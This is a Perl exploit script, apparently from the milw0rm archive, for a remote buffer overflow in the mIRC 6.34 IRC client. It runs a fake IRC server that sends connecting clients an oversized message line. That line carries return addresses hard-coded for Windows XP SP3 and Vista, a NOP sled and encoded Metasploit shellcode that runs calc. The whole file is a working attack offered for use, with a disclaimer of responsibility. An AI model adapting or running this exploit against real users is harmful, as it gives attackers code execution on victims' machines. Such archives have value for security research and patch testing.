#!/usr/bin/perl
#
#
# mIRC 6.34 Remote Buffer Overflow Exploit
# Exploit by SkD (skdrat <at> hotmail <.> com)
# ----------------------------------------
# A day's work of debugging and looking at mIRC.
#
# Tested on Windows XP SP3 English and Windows Vista SP0.
#
# Credits to securfrog for publishing the PoC.
#
# Author has no responsibility over the damage you do with this!
#
# Note: You might change the addresses for Vista ;)
#
# ----------------------------------------



use IO::Socket;

if(!($ARGV[1]))
{
 print "\n[x] mIRC 6.34 Remote Buffer Overflow Exploit\n";
 print "[x] Exploit by SkD (skdrat@ hotmail.com)\n\n";
 print "[x] Use: mirc_exp.pl <port> <OS = 1 for XP Sp3 AND 2 for Vista SP0>\n[x] Example: mirc_exp.pl 6667 0\n\n";
 exit;
}


while(1)
{

my $sock=new IO::Socket::INET (
Listen    => 1,

LocalAddr => '127.0.0.1',

LocalPort => $ARGV[0],

Proto     => 'tcp');  

die unless $sock;

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com 
my $shellcode =
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x1e".
"\x95\x97\xf1\x83\xeb\xfc\xe2\xf4\xe2\x7d\xd3\xf1\x1e\x95\x1c\xb4".
"\x22\x1e\xeb\xf4\x66\x94\x78\x7a\x51\x8d\x1c\xae\x3e\x94\x7c\xb8".
"\x95\xa1\x1c\xf0\xf0\xa4\x57\x68\xb2\x11\x57\x85\x19\x54\x5d\xfc".
"\x1f\x57\x7c\x05\x25\xc1\xb3\xf5\x6b\x70\x1c\xae\x3a\x94\x7c\x97".
"\x95\x99\xdc\x7a\x41\x89\x96\x1a\x95\x89\x1c\xf0\xf5\x1c\xcb\xd5".
"\x1a\x56\xa6\x31\x7a\x1e\xd7\xc1\x9b\x55\xef\xfd\x95\xd5\x9b\x7a".
"\x6e\x89\x3a\x7a\x76\x9d\x7c\xf8\x95\x15\x27\xf1\x1e\x95\x1c\x99".
"\x22\xca\xa6\x07\x7e\xc3\x1e\x09\x9d\x55\xec\xa1\x76\x65\x1d\xf5".
"\x41\xfd\x0f\x0f\x94\x9b\xc0\x0e\xf9\xf6\xf6\x9d\x7d\x95\x97\xf1";

print "[x] Listening on port ".$ARGV[0]."..\r\n";
$s=$sock->accept();
print "[x] Got a user!\r\n";
$overflow = "\x41" x 307;
$overflow2 = "B" x 12;
$eip_vista = "\x66\x1c\xc2\x76";    #Normaliz.DLL pop pop ret
$eip2_vista = "\xd3\xdb\x54\x77";   #MSFCT.DLL jmp esp
$eip_xpsp3 = "\xd1\xfb\x92\x77";    #SETUPAPI.DLL 0x7792FBD1 pop eax pop ret
$eip2_xpsp3 = "\xb7\x87\x9d\x77";   #SETUPAPI.DLL 0x779D87B7 jmp esp
$addr = "\xb5\xb5\xfd\x7f"; 
$nop_sled = "\x90" x 4;
$jmp = "\xEB\x03\xFF\xFF";

print "[x] Sending packets..\r\n";

print $s ":my_irc_server.com 001 wow :Welcome to the Internet Relay Network wow\r\n";
sleep(1);
if($ARGV[1] == "1"){
print $s ":".$overflow.$eip_xpsp3.$addr.$nop_sled.$eip2_xpsp3.$nop_sled.$overflow2.$jmp.$nop_sled.$shellcode.$nop_sled." PRIVMSG  wow : /FINGER wow.\r\n";
}else{
print $s ":".$overflow.$eip_vista.$addr.$nop_sled.$eip2_vista.$nop_sled.$overflow2.$jmp.$nop_sled.$shellcode.$nop_sled." PRIVMSG  wow : /FINGER wow.\r\n";
}
print "[x] Check it out!\r\n";
}

# milw0rm.com [2008-10-04]
